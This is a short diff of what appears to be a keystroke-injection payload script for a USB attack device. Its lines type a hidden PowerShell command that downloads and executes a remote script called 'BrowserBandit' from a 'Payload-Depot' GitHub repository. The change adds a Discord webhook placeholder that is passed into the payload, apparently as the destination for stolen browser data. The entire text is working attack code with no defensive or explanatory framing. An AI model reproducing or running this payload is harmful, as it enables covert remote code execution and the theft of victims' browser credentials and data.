@@ -9,5 +9,7 @@ ALT Y
 ENTER
 
 DELAY 3000
-STRING Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -Command iex (iwr 'https://raw.githubusercontent.com/Code-382/Payload-Depot/main/SignalStrike/Browser%20Bandit/BrowserBandit.txt').Content" -NoNewWindow
+STRING $webhook = '<DISCORD WEBHOOK HERE>'
+STRING Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -Command `$webhook='$webhook'; iex (iwr 'https://raw.githubusercontent.com/Code-382/Payload-Depot/main/SignalStrike/Browser%20Bandit/BrowserBandit.txt').Content" -NoNewWindow
+
 ENTER
